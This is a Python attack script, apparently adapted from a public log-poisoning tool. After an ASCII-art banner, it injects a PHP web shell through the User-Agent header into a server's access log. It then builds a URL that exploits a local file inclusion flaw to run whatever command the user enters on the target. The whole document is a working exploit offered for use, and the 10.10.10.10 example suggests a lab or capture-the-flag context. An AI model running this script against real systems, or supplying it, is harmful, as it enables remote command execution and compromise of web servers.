#!/usr/bin/python3
# python3 logpoisoner.py to run the script.
# taken from https://github.com/nickpupp0/LogPoisoner/blob/main/logpoisoner.py as a reference, modified a lot.
print("                                                       /%")                   
print("                                                     *&&@@&#")                  
print("                                                    @@@@@@@@@&")                
print("                                                   @@&&@%   @@&@")              
print("                                                   &&&@@      %@@")             
print("                  /%&@@@                           &@@&        &&.")            
print("                  @@@&@@@@                        &@@@&         @@")            
print("                  @&&,&@&@@@     . ,             &@&@@%          &*")           
print("                   &@/. ,@@@&&@@&&&%%@&&&%&#&&# &@@@@@(          &%")           
print("                   .&@    (&&@@@&&&&@&%&&@%%&&&@&&@@@&@  ,")                    
print("                     &&    (&@@&&&&&%&&&&&&&@&&&&@@@&&&*,..         /.")        
print("     #@@@@@&&@@@#(((%@@@@&@&&@&&%&&&&@@&&&%&@&@&&&&&&@&@&       @&@@@%@@@&%")   
print(" &&@&@@@@@@@@@@@@@@&@@&@@@@@@@&&%&@&%@@%&&&@&&&@&@@@@&@@&&@@@@&@@@@@&(((//%")   
print("/(/(//@@@&@@@@&@&@@@@@@@&@&@@@&&&&@%&&&%&&%@&&%@&&@%@&@&@@@@@@@@@@@@@@&&(&")    
print(" @&%&@@@.                 /&&&&@&%&@@&%%&@&&&%&&@&%%%#@&@&@@&.    (&@@@@&")     
print("   &@@@@@&                  .#. @%&&% .@&  %(  ,@%%&%#(%         &@@&@@&*")     
print("    *@@@@@@                      &&&   &&  &       (#/          @@@&@@.")       
print("      &&@@@@@                     ,%(                          ,@@&@&")         
print("        &&&&&@                                                .@@&&@")          
print("          &&@&@.                                               &&&&")           
print("            @@@&@@@@@&&                                       &&@@")            
print("              %%@&@&&@%(                                     @@%.")             
print("                     ,                                     &@&,")               
print("                                                             %&") 
print("	                 					    ")

import requests
import urllib.parse       


url = input('[+] Enter the full url with the log file - i.e. http://10.10.10.10/site/index.php?page=/xampp/apache/logs/access.log\n URL: ')
print(url)
headers = {
    'User-Agent': 'User-Agent: Mozilla/5.0 <?php system($_GET[\'cmd\']); ?> Safari/537.36'
}
response = requests.get(url, headers=headers)
cmd=input("Enter a command:")
commandPath=urllib.parse.quote(cmd)
fullcmd=f"&cmd={commandPath}"

print("[+] Poisoning...")
if response.status_code != 200:
    print(f"[-] Response code was: {response.status_code}\n")
    print("[-] Response did not equal 200. Quitting...")
    exit()

print(response)
print("[+] Log file poisoned!")
print(f" You entered: {cmd}")
print(response)
print("[+] Try the path below to get the output output of your command. It is best to view in source-code:\n")
print(url+fullcmd)
